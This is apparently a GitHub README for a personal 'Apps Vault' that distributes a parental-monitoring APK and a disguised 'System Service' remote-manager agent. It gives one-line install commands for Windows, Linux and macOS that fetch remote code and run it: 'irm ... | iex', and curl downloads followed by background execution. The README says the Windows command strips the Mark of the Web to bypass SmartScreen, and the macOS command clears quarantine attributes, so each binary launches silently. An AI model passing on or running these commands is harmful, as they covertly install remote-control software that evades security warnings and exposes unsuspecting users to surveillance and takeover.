<p align="center">
  <img src="assets/banner.svg" alt="Apps Vault Banner" width="100%">
</p>

# 📱 Apps Vault — Satyam Kumar

Central distribution hub, binary release repository, and direct download center.

---

## 📦 Published Applications & Releases

| App Name | Category | Version | Direct Download Links |
| :--- | :--- | :--- | :--- |
| **Minor Monitor** | Parental Control & Diagnostics | `v1.3.2` | [📥 Download APK (v1.3.2)](https://github.com/satyamkumar420/apps-vault/releases/download/v1.3.2/app-release.apk) \| [Release Notes](https://github.com/satyamkumar420/apps-vault/releases/tag/v1.3.2) |
| **System Service** | Cross-Platform Background Remote Service | `v2.0.0` | **Windows:** [📥 Silent EXE](https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/remote-manager/windows/system-service-windows-silent.exe) · [⚡ Fast Zip (2.9MB)](https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/remote-manager/windows/system-service-windows-silent.exe.zip) · [📥 Debug EXE](https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/remote-manager/windows/system-service-windows-debug.exe) · [📜 Silent BAT](https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/remote-manager/windows/run-silent.bat)<br/>**Linux:** [📥 x86_64 (amd64)](https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/remote-manager/linux/system-service-linux-amd64) · [⚡ Fast Tar (3.2MB)](https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/remote-manager/linux/system-service-linux-amd64.tar.gz) · [📥 ARM64](https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/remote-manager/linux/system-service-linux-arm64)<br/>**macOS:** [📥 Apple Silicon (arm64)](https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/remote-manager/macos/system-service-darwin-arm64) · [📥 Intel (amd64)](https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/remote-manager/macos/system-service-darwin-amd64) |

---

## ⚡ Remote Manager Agent — Quick Install & Run

### 🪟 Windows (1-Liner PowerShell — No SmartScreen Prompt)
Open PowerShell and run this one-liner. It downloads the ultra-fast lightweight compressed archive (~2.9 MB), extracts silently into `%APPDATA%\SystemService`, strips the NTFS Mark of the Web (`Zone.Identifier`) to completely bypass Windows SmartScreen, and launches silently in the background:

```powershell
irm https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/remote-manager/windows/install.ps1 | iex
```

> **Manual Run:** If you downloaded `system-service-windows-silent.exe` or its `.zip` directly via browser, extract and run `run-silent.bat` in the same folder.

---

### 🐧 Linux (1-Liner Bash)
```bash
curl -sSL https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/remote-manager/linux/system-service-linux-amd64 -o /tmp/system-service && chmod +x /tmp/system-service && (/tmp/system-service >/dev/null 2>&1 &)
```

---

### 🍏 macOS (1-Liner Terminal)
```bash
# Apple Silicon (M1/M2/M3/M4)
curl -sSL https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/remote-manager/macos/system-service-darwin-arm64 -o /tmp/system-service && chmod +x /tmp/system-service && xattr -c /tmp/system-service && (/tmp/system-service >/dev/null 2>&1 &)
```

---

## 📱 Android Applications
1. Download the target `.apk` file directly from the table above or the [Releases Tab](https://github.com/satyamkumar420/apps-vault/releases).
2. Open the downloaded `.apk` file on your Android device.
3. Allow installation from unknown sources if prompted by your Android OS.
